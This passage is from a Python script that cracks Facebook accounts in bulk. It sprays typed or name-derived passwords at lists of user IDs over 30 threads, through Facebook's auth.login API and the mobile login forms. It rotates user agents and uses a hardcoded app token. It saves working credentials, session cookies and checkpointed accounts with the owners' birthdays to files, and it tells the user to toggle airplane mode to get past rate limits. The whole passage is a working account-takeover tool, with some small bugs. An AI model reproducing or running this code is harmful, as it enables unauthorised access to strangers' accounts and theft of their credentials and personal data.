	print(" \x1b[1;92m[\x1b╠══[1;93m!\x1b[1;92m] \x1b[1;93mUse , (koma) \x1b[1;93mfor example separator \x1b[1;97m: \x1b[1;93msandi123\x1b[1;97m,sandi12345,\x1b[1;93mdll\x1b[1;97m. \x1b[1;93meach word is at least 6 characters or more")
	pwek=raw_input('\n \x1b╠══[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93menter password \x1b[1;93m: \x1b[1;92m')
	print(' \x1b[1;92m[\x1b╠══[1;93m+\x1b[1;92m] \x1b[1;93mcrack with password -> \x1b[1;92m[ \x1b[1;93m%s%s%s \x1b[1;92m]' % (M, pwek, N))
	if pwek=="":
		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mfill in the answer correctly\x1b[1;97m!"%(M))
	elif len(pwek)<=5:
		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mEnter a password of at least 6 digits\x1b[1;97m!"%(M))
        print('%s \x1b[1;92m║'%(O))
	print(" \x1b[1;92m[ \x1b[1;93mselect method version - please try one ² \x1b[1;92m]")
        print('%s \x1b[1;92m║'%(O))
	print(" \x1b[1;92m╠══[\x1b[1;93m01\x1b[1;92m] \x1b[1;93mmethod API \x1b[1;92m(\x1b[1;93mfast\x1b[1;92m)")
	print(" \x1b[1;92m╠══[\x1b[1;93m02\x1b[1;92m] \x1b[1;93mmethod mbasic \x1b[1;92m(\x1b[1;93mslow\x1b[1;92m)")
	print(" \x1b[1;92m╠══[\x1b[1;93m03\x1b[1;92m] \x1b[1;93mmethod mobile \x1b[1;92m(\x1b[1;93msuper slow\x1b[1;92m)")
	ask=raw_input(" \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod \x1b[1;97m: \x1b[1;92m")
	if ask=="":
		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mfill in the answer correctly\x1b[1;97m!"%(M))
	elif ask=="1":
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[+] OK result saved to > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m╠══[+] CP result saved to > CP/%s.txt' % (tanggal))
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mPlay Airplane Mode 5sec if no result\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(api, uid, pwek.split(","))
		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mThe crack is complete dear...\x1b[1;97m")
	elif ask=="2":
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[+] OK result saved to > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m╠══[+] CP result saved to > CP/%s.txt' % (tanggal))
		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mPlay Airplane Mode 5sec if no result\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(mfbasic, uid, pwek.split(","),"https://mbasic.facebook.com")
		exit(" \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mThe crack is complete dear...\x1b[1;97m")
	elif ask=="3":
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[+] OK result saved to > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m╠══[+] CP result saved to > CP/%s.txt' % (tanggal))
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mPlay Airplane Mode 5sec if no result\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				fall.submit(mfbasic, uid, pwek.split(","),"https://m.facebook.com")
		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mThe crack is complete dear...\x1b[1;97m")
	
def sandiotomatis():
        print('%s \x1b[1;92m║'%(O))
	print(" \x1b[1;92m╠══[ \x1b[1;93mselect method version - please try one ² \x1b[1;92m]")
        print('%s \x1b[1;92m║'%(O))
	print(" \x1b[1;92m╠══[\x1b[1;93m01\x1b[1;92m] \x1b[1;93mmethod API \x1b[1;92m(\x1b[1;93mfast\x1b[1;92m)")
	print(" \x1b[1;92m╠══[\x1b[1;93m02\x1b[1;92m] \x1b[1;93mmethod mbasic \x1b[1;92m(\x1b[1;93mslow\x1b[1;92m)")
	print(" \x1b[1;92m╠══[\x1b[1;93m03\x1b[1;92m] \x1b[1;93mmethod mobile \x1b[1;92m(\x1b[1;93msuper slow\x1b[1;92m)")
        print('%s \x1b[1;92m║'%(O))
	ask=raw_input(" \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod \x1b[1;97m: \x1b[1;92m")
	if ask=="":
		exit(" %s\x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mfill in the answer correctly\x1b[1;97m!"%(M))
	elif ask=="1":
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[+] OK result saved to > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m╠══[+] CP result saved to > CP/%s.txt' % (tanggal))
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mPlay Airplane Mode 5sec if no result\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",nam[0]+"1234"]
				fall.submit(api, uid, pwx)
		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mThe crack is complete dear...\x1b[1;97m")
	elif ask=="2":
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[+] OK result saved to > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m╠══[+] CP result saved to > CP/%s.txt' % (tanggal))
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mPlay Airplane Mode 5sec if no result\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				fall.submit(mfbasic, uid, pwx,"https://mbasic.facebook.com")
		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mThe crack is complete dear...\x1b[1;97m")
	elif ask=="3":
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[+] OK result saved to > OK/%s.txt' % (tanggal))
		print(' \x1b[1;93m╠══[+] CP result saved to > CP/%s.txt' % (tanggal))
                print('%s \x1b[1;92m║'%(O))
		print(' \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mPlay Airplane Mode 5sec if no result\n')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345"]
				fall.submit(mfbasic, uid, pwx,"https://m.facebook.com")
		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mThe crack is complete dear...\x1b[1;97m")
		
### BAGIAN CRACK ###
def api(uid, pwx):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;92m[\x1b[1;93mcrack\x1b[1;92m] %s/%s \x1b[1;92mOK:-%s - \x1b[1;93mCP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ua = random.choice([
			'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0 Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 625) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537',
			'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
			'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
			'Mozilla/5.0 (Linux; Android 11; RMX2151) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/26.0.0.4.133‎;]',
			'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; ar) Presto/2.12.423 Version/12.16',
			'Mozilla/5.0 (Linux; Android 10; RMX2086) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36 OPR/64.2.3282.60128[FBAN/EMA;FBLC/ar_AR;FBAV/239.0.0.10.109;]',
			'Mozilla/5.0 (Linux; Android 11; RMX2151) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/340.0.0.27.113;]'
		])
		headers = ({
			'Authorization': 'OAuth 350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
			'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)),
			'x-fb-sim-hni': str(random.randint(20000, 40000)),
			'x-fb-net-hni': str(random.randint(20000, 40000)),
			'x-fb-connection-quality': 'EXCELLENT',
			'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'x-fb-http-engine': 'Liger'
		})
		params = {
			'format': 'JSON',
			'sdk_version': '2',
			'email': str(uid),
			'locale': 'en_US',
			'password': str(pw),
			'sdk': 'ios',
			'generate_session_cookies': '1',
			'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
		}
		status_masuk = requests.get("https://b-api.facebook.com/method/auth.login",headers=headers,params=params) 
		file_jason = json.loads(status_masuk.text)
		if "Calls to this api have exceeded the rate limit. (613)" in file_jason:
			t=15
			while t:
				mins, secs = divmod(t, 60)
				sys.stdout.write("\r %s[!] turn on airplane mode for 5 seconds%s"%(M,N))
				sys.stdout.flush()
				sleep(1.5)
				t -= 1
		elif "session_key" in status_masuk.text and "EAAA" in status_masuk.text:
			print("\r  %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("  [OK] %s|%s\n"%(uid, pw))
			break
		elif "User must verify their account on www.facebook.com (405)" in status_masuk.text:
			try:
				token=open("token.txt","r").read()
				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
				month, day, year = ttl.split("/")
				month = bulan[month]
				print("\r  %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r  %s[CP] %s|%s         "%(K,uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def mfbasic(uid, pwx,url,**data):
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;92m[\x1b[1;93mcrack\x1b[1;92m] %s/%s \x1b[1;92mOK:-%s - \x1b[1;93mCP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		ua = random.choice([
			'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0 Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 625) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537',
			'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
			'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
			'Mozilla/5.0 (Linux; Android 11; RMX2151) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/26.0.0.4.133‎;]',
			'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; ar) Presto/2.12.423 Version/12.16',
			'Mozilla/5.0 (Linux; Android 10; RMX2086) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36 OPR/64.2.3282.60128[FBAN/EMA;FBLC/ar_AR;FBAV/239.0.0.10.109;]',
			'Mozilla/5.0 (Linux; Android 11; RMX2151) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/340.0.0.27.113;]'
		])
		ge=s.get(url+"/login/?next&ref=dbl&refid=8").text
		sop=parser(ge,"html.parser")
		for i in sop.find_all("raw_input"):
			if i.get("name")==None or "_fb_noscript" in i.get("name") or "sign_up" in i.get("name"):continue
			else:data.update({i.get("name"):i.get("value")})
		data.update({"email":uid,"pass":pw})
		log_in=url+sop.find("form",method="post").get("action")
		if "m.facebook.com" in url:
			s.headers.update({"Host":re.findall("//(.+)",url)[0],"x-fb-lsd":data.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":ua,"referer":url+"/login/?next&ref=dbl&fl&refid=8","origin":url,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		else:
			if "mbasic.facebook.com" in url:
				hea="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
			else:
				hea="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
		s.headers.update({"Host":re.findall("//(.+)",url)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":hea,"origin":url,"user-agent":ua,"referer":url+"/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		po=s.post(log_in,data=data)
		if "c_user" in s.cookies.get_dict().keys():
			kukis = ";".join([e+"="+v for e,v in s.cookies.get_dict().items()])
			print("\r  %s[OK] %s|%s|%s"%(H,uid, pw, kukis))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("  [OK] %s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in s.cookies.get_dict().keys():
			try:
				token=open("token.txt","r").read()
				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
				month, day, year = ttl.split("/")
				month = bulan[month]
				print("\r  %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r  %s[CP] %s|%s         "%(K,uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("  [CP] %s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def buatfolder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

if __name__ == '__main__':
	os.system("git pull")
	buatfolder()
	menu()
